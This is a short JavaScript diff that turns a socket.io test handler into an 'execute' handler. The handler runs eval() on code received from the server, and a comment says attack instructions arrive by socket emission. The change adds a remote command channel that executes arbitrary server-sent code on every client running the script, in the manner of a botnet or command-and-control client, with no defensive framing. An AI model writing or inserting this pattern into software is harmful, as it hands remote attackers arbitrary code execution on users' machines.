@@ -1,5 +1,6 @@
 var socket = io();
 
-socket.on('test', function(){
-  console.log('received attack: test');
+socket.on('execute', function(data){
+  //attack instructions are passed in with socket emission
+  eval(data.func);
 });
